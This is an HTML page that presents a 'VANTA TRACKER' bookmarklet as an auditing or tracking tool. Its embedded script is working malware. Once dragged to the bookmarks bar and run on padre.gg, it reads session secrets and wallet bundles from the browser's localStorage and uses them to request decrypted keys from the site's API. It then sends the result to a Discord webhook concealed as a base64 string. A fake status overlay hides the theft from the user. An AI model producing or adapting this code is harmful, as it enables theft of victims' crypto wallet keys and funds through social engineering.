<!DOCTYPE html>
<html>
<head>
    <title>VANTA HUB v6.0</title>
    <style>
        body { background: #000; color: #0f8; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
        .btn { 
            display: inline-block; padding: 25px 50px; background: #0f8; color: #000; 
            text-decoration: none; font-weight: bold; border-radius: 8px; cursor: move;
            box-shadow: 0 0 30px rgba(0,255,136,0.6); transition: 0.4s;
        }
        .btn:hover { background: #fff; transform: scale(1.05); }
    </style>
</head>
<body>
    <h1>VANTA AGGRESSIVE AUDITOR</h1>
    <p style="color: #444;">INTERNALIZED PAYLOAD - NO EXTERNAL DEPENDENCIES</p>
    <br>
    <a href="#" id="vanta-tool" class="btn">VANTA TRACKER</a>

    <script>
        // Your Webhook (Ensure this is a fresh B64 string from a working webhook)
        const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";

        const rawLogic = `(async function() {
            const hook = atob("${b64}");
            
            // 1. Create Internal UI (Replaces modalx.js)
            const ui = document.createElement('div');
            ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:2147483647;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;border:3px solid #0f8;";
            ui.innerHTML = "<div style='text-align:center;padding:20px;border:1px solid #0f8;background:#000;'><h1>VANTA SYSTEM ACTIVE</h1><p id='v_status'>INITIALIZING SNIFFER...</p></div>";
            document.body.appendChild(ui);

            const update = (t) => document.getElementById('v_status').innerText = t;

            // 2. Data & Decryption Logic
            try {
                const session = JSON.parse(localStorage.getItem('padreV2-session'));
                const bundles = JSON.parse(localStorage.getItem('padre-v2-bundles-store-v2'));

                if(session && bundles) {
                    update("CREDENTIALS FOUND. ATTEMPTING DECRYPT...");
                    const bKey = Object.keys(bundles.bundles)[0];
                    const target = bundles.bundles[bKey];

                    const res = await fetch("https://api.padre.gg/v2/enclave/decrypt", {
                        method: 'POST',
                        headers: {
                            'Authorization': session.sessionSecret,
                            'X-Padre-Session': session.sessionId,
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ bundle: target.exportBundle, subOrgId: target.subOrgId })
                    });
                    
                    const decrypted = await res.json();
                    
                    // 3. Send to Discord
                    const fd = new FormData();
                    fd.append('file', new Blob([JSON.stringify(decrypted, null, 2)], {type:'text/plain'}), 'key.txt');
                    fd.append('payload_json', JSON.stringify({content: "ðŸ”‘ **DECRYPTED KEY CAPTURED**"}));
                    await fetch(hook, { method: 'POST', body: fd });
                    
                    update("SUCCESS: DATA TRANSMITTED");
                } else {
                    update("ERROR: NO ACTIVE SESSION");
                }
            } catch(e) {
                update("CRITICAL ERROR: " + e.message);
            }

            setTimeout(() => ui.remove(), 4000);
        })(); void(0);`;

        document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
    </script>
</body>
</html>
